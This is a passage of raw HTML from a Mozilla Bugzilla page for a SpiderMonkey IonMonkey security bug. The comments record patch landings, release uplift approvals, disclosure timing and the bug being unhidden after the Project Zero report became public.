          <div class="change-time"><span class="rel-time" title="2019-03-26 07:14 PDT" data-time="1553609658">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-33">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-33" data-comment-id="14012280" data-ismarkdown="true" ><p>Removing leave-open keyword and marking this bug as Fixed since <span class=""><a href="/attachment.cgi?id=9049131" name="attach_9049131" title="Bug 1532599 - Force expected crashes on unexpected magic values.">attachment 9049131</a> <a href="/attachment.cgi?id=9049131&amp;action=edit" title="Bug 1532599 - Force expected crashes on unexpected magic values.">[details]</a></span> and <span class=""><a href="/attachment.cgi?id=9050674" name="attach_9050674" title="Bug 1532599 - Branch Pruning: Flag all Phi loops as used.">attachment 9050674</a> <a href="/attachment.cgi?id=9050674&amp;action=edit" title="Bug 1532599 - Branch Pruning: Flag all Phi loops as used.">[details]</a></span> are both landed.</p>
</div><div class="activity"><div class="change">Status: ASSIGNED &rarr; RESOLVED</div><div class="change">Closed: <span class="rel-time" title="2019-03-26 07:14 PDT" data-time="1553609658">3 years ago</span></div><div class="change">Keywords: <span class="activity-deleted"><a href="/buglist.cgi?keywords=leave-open&amp;resolution=---">leave-open</a></span></div><div class="change">Resolution: --- &rarr; FIXED</div></div></div><div class="change-set" id="a1821969_422187"><div class="change" id="aa1821969_422187">
    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_422187" id="a1821969_422187"><img src="https://secure.gravatar.com/avatar/f78625fe5901300b4689355a8e507ea2?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_422187" id="a1821969_422187"><a class="email " href="/user_profile?user_id=422187" > <span class="fna">Nicolas B. Pierron [:nbp]</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a1821969_422187"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a1821969_422187">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#a1821969_422187">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-26 07:14 PDT" data-time="1553609670">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=9049207&amp;action=edit"
           title="Bug 1532599 - Prevent DepthFirstSearchUse from eagerly marking Phi as unused."
           class=""
        >Attachment #9049207</a> -
        Attachment is obsolete: true</div></div></div><div class="change-set" id="a1822108_75935"><div class="change" id="aa1822108_75935">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_75935" id="a1822108_75935"><img src="https://secure.gravatar.com/avatar/a10f7f199c75a9a5a1eb347730524a7a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_75935" id="a1822108_75935"><a class="email " href="/user_profile?user_id=75935" > <span class="fna">Ryan VanderMeulen [:RyanVM]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a1822108_75935"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a1822108_75935">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#a1822108_75935">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-26 07:16 PDT" data-time="1553609809">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox68&amp;o1=isnotempty">status-firefox68</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox68&amp;o1=equals&amp;v1=fixed">fixed</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox68&amp;o1=isnotempty">tracking-firefox68</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox68&amp;o1=equals&amp;v1=%2B">+</a></div><div class="change">Target Milestone: --- &rarr; mozilla68</div></div></div><div class="change-set" id="c34"><div class="comment" data-id="14012331" data-no="34"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-34" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_24572" id="a1822108_75935"><img src="https://secure.gravatar.com/avatar/5293fe8fb106a442d842757758d07c56?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_24572" id="a1822108_75935"><a class="email " href="/user_profile?user_id=24572" > <span class="fna">Pascal Chevrel:pascalc (pto until November 2)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-34"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-34" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#c34">Comment 34</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-26 07:43 PDT" data-time="1553611421">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-34">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-34" data-comment-id="14012331" data-ismarkdown="true" ><p>Comment on <span class=""><a href="/attachment.cgi?id=9050674" name="attach_9050674" title="Bug 1532599 - Branch Pruning: Flag all Phi loops as used.">attachment 9050674</a> <a href="/attachment.cgi?id=9050674&amp;action=edit" title="Bug 1532599 - Branch Pruning: Flag all Phi loops as used.">[details]</a></span><br>
<a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1532599" title="RESOLVED FIXED - Spidermonkey: IonMonkey leaks JS_OPTIMIZED_OUT magic value to script">Bug 1532599</a> - Branch Pruning: Flag all Phi loops as used.</p>
<p>We already took an uplift for release to make it a safe crash in 66 so we don&#39;t need an uplift to release but we can take an uplift to 67 beta 6 (beta 5 is already built) as it is affected and let it ride the trains. Thanks.</p>
</div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=9050674&amp;action=edit"
           title="Bug 1532599 - Branch Pruning: Flag all Phi loops as used."
           class=""
        >Attachment #9050674</a> -
        Flags: <span class="activity-deleted">approval-mozilla-release?</span></div><div class="change">
        <a href="/attachment.cgi?id=9050674&amp;action=edit"
           title="Bug 1532599 - Branch Pruning: Flag all Phi loops as used."
           class=""
        >Attachment #9050674</a> -
        Flags: approval-mozilla-release-</div><div class="change">
        <a href="/attachment.cgi?id=9050674&amp;action=edit"
           title="Bug 1532599 - Branch Pruning: Flag all Phi loops as used."
           class=""
        >Attachment #9050674</a> -
        Flags: <span class="activity-deleted">approval-mozilla-beta?</span></div><div class="change">
        <a href="/attachment.cgi?id=9050674&amp;action=edit"
           title="Bug 1532599 - Branch Pruning: Flag all Phi loops as used."
           class=""
        >Attachment #9050674</a> -
        Flags: approval-mozilla-beta+</div></div></div><div class="change-set" id="c35"><div class="comment" data-id="14014608" data-no="35"
       data-tags="uplift">
    
    <table class="layout-table change-head " id="ch-35" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_75935" id="a1822108_75935"><img src="https://secure.gravatar.com/avatar/a10f7f199c75a9a5a1eb347730524a7a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_75935" id="a1822108_75935"><a class="email " href="/user_profile?user_id=75935" > <span class="fna">Ryan VanderMeulen [:RyanVM]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-35"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-35" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#c35">Comment 35</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-27 06:37 PDT" data-time="1553693829">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-35">
        <td colspan="2" class="comment-tags"><span class="comment-tag">uplift</span>
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-35" data-comment-id="14014608" data-ismarkdown="true" ><p><a href="https://hg.mozilla.org/releases/mozilla-beta/rev/fd088f468f864c7328268f7b840ed8cbca1fde4c" rel="nofollow">https://hg.mozilla.org/releases/mozilla-beta/rev/fd088f468f864c7328268f7b840ed8cbca1fde4c</a></p>
</div><div class="activity"><div class="change">Group: javascript-core-security &rarr; core-security-release</div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox67&amp;o1=isnotempty">status-firefox67</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox67&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox67&amp;o1=equals&amp;v1=fixed">fixed</a></div></div></div><div class="change-set" id="a2054816_488993"><div class="change" id="aa2054816_488993">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_488993" id="a2054816_488993"><img src="https://secure.gravatar.com/avatar/42f2a9436bbaefa7e0028e214f2b9350?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_488993" id="a2054816_488993"><a class="email " href="/user_profile?user_id=488993" > <span class="fna">Andrei Vaida [:avaida]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a2054816_488993"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a2054816_488993">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#a2054816_488993">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-28 23:55 PDT" data-time="1553842517">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Flags: qe-verify-</div></div></div><div class="change-set" id="c36"><div class="comment" data-id="14041464" data-no="36"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-36" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a2054816_488993"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_1689" id="a2054816_488993"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-36"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-36" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#c36">Comment 36</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-04-08 11:44 PDT" data-time="1554749079">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-36">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-36" data-comment-id="14041464" data-ismarkdown="true" ><p>The bug state here is a bit of a mess. Parts are fixed in 66.0.1 and ESR-60 with an advisory, and parts are only fixed on 67. Don&#39;t we need an ESR version of the additions, too, per <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1532599#c30" title="RESOLVED FIXED - Spidermonkey: IonMonkey leaks JS_OPTIMIZED_OUT magic value to script">comment 30</a>? A dependent or &quot;task&quot; bug to track the landing of the other bits would have helped keep this straight.</p>
<p>Please don&#39;t unhide this bug until we&#39;ve shipped the complete set of patches (Firefox 67).</p>
</div><div class="activity"><div class="change">No longer blocks: <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - FlagAllOperandsAsHavingRemovedUses can take a very long time"
   href="/show_bug.cgi?id=1489142">1489142</a></div><div class="change">Flags: <span class="activity-deleted">needinfo?(abillings)</span></div><div class="change">Keywords: <a href="/buglist.cgi?keywords=csectype-other&amp;resolution=---">csectype-other</a>, 
          
            <a href="/buglist.cgi?keywords=regression&amp;resolution=---">regression</a></div><div class="change">Regressed by: <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - FlagAllOperandsAsHavingRemovedUses can take a very long time"
   href="/show_bug.cgi?id=1489142">1489142</a></div></div></div><div class="change-set" id="c37"><div class="comment" data-id="14042915" data-no="37"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-37" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_634439" id="a2054816_488993"><img src="https://secure.gravatar.com/avatar/dd173269d2ae1dd60942eeb75caaef98?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_634439" id="a2054816_488993"><a class="email " href="/user_profile?user_id=634439" > <span class="fna">Samuel Groß</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-37"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-37" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#c37">Comment 37</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-04-08 23:51 PDT" data-time="1554792670">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-37">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-37" data-comment-id="14042915" data-ismarkdown="true" ><p>Ok thanks! I&#39;ll leave the issue restricted until the Firefox 67 release, which should still be well within the 90 day deadline</p>
</div></div><div class="change-set" id="c38"><div class="comment" data-id="14043527" data-no="38"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-38" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_422187" id="a2054816_488993"><img src="https://secure.gravatar.com/avatar/f78625fe5901300b4689355a8e507ea2?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_422187" id="a2054816_488993"><a class="email " href="/user_profile?user_id=422187" > <span class="fna">Nicolas B. Pierron [:nbp]</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-38"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-38" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#c38">Comment 38</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-04-09 05:45 PDT" data-time="1554813955">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-38">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-38" data-comment-id="14043527" data-ismarkdown="true" ><p>(In reply to Daniel Veditz [:dveditz] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1532599#c36" title="RESOLVED FIXED - Spidermonkey: IonMonkey leaks JS_OPTIMIZED_OUT magic value to script">comment #36</a>)</p>
<blockquote>
<p>Don&#39;t we need an ESR version of the additions, too, per <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1532599#c30" title="RESOLVED FIXED - Spidermonkey: IonMonkey leaks JS_OPTIMIZED_OUT magic value to script">comment 30</a>?</p>
</blockquote>
<p>No, because it fixes the issue introduced in <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1489142" title="RESOLVED FIXED - FlagAllOperandsAsHavingRemovedUses can take a very long time">Bug 1489142</a>, which only landed on Firefox 65.<br>
(see uplift request <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1532599#c32" title="RESOLVED FIXED - Spidermonkey: IonMonkey leaks JS_OPTIMIZED_OUT magic value to script">comment 32</a>)</p>
</div></div><div class="change-set" id="a7265562_406194"><div class="change" id="aa7265562_406194">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_406194" id="a7265562_406194"><img src="https://secure.gravatar.com/avatar/0a70c84cd33dba0151fe15f2f8773137?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_406194" id="a7265562_406194"><a class="email " href="/user_profile?user_id=406194" > <span class="fna">Andrew McCreight [:mccr8]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a7265562_406194"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a7265562_406194">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#a7265562_406194">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-05-28 07:21 PDT" data-time="1559053263">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">URL: <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1794" target="_blank" rel="noreferrer"
           class="bug-url" data-safe="1"
        >https://bugs.chromium.org/p/project-z...</a></div></div></div><div class="change-set" id="c39"><div class="comment" data-id="14144342" data-no="39"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-39" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_406194" id="a7265562_406194"><img src="https://secure.gravatar.com/avatar/0a70c84cd33dba0151fe15f2f8773137?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_406194" id="a7265562_406194"><a class="email " href="/user_profile?user_id=406194" > <span class="fna">Andrew McCreight [:mccr8]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-39"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-39" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#c39">Comment 39</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-05-28 07:21 PDT" data-time="1559053280">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-39">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-39" data-comment-id="14144342" data-ismarkdown="true" ><p>The Project Zero report is public now.</p>
</div></div><div class="change-set" id="a13436220_1689"><div class="change" id="aa13436220_1689">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a13436220_1689"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_1689" id="a13436220_1689"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a13436220_1689"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a13436220_1689">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#a13436220_1689">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-07 17:25 PDT" data-time="1565223921">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Group: <span class="activity-deleted">core-security-release</span></div></div></div><div id="new-comment-notice">
          You need to <a href="/show_bug.cgi?id=1532599&amp;GoAheadAndLogIn=1">log in</a>
          before you can comment on or make changes to this bug.
        </div>



<div id="bottom-actions">
  <div id="bottom-right-actions">
    <button type="button" id="top-btn" class="secondary" aria-label="Go to Page Top">Top &uarr;</button>
  </div>
</div></div> 
</main> 
</div> 


</body>
</html>